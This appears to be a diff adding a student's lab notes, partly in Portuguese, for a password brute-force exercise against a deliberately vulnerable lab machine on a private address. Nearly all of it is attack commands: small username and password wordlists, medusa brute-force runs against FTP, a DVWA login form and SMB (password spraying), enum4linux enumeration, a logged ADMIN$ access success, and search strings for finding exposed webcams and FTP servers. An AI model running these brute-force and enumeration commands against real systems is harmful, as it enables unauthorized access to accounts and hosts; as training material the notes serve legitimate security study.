@@ -1,0 +1,30 @@
+"Server: IP Webcam Server" "200 OK"
+"220""230 Login sucessful" port 21
+
+
+msfadmin
+
+echo -e 'user\nmsfadmin\nadmin\nroot' > users.txt
+echo -e '123456\npassword\nqwerty\nmsfadmin' > pass.txt
+
+echo -e 'user\nfs\nmsfadmin\nadmin\nroot' > users.txt
+
+
+medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6
+
+medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
+-m PAGE:'/dvwa/login.php' \
+-m FORM:'username=^USER^&password=^PASS^&Login=login' \
+-m 'FAIL=Login failed' -t 6
+
+enum4linux -a 192.168.56.102 | tee enum4_output.txt
+
+echo -e 'user\nmsfadmin\nservice' > smb_users.txt   -- Criação de wordlist
+
+echo -e 'password\n123456\nWelcome123\nmsfadmin' > senha_spray.txt 
+
+// Ataque  medusa 
+medusa -h 192.168.56.102 -U smb_users.txt -P senha_spray.txt -M smbnt -t 2 T 50
+[SUCCESS (ADMIN$ - Access Allowed)]
+
+smbclient -L //192.168.56.102 -U msfadmin
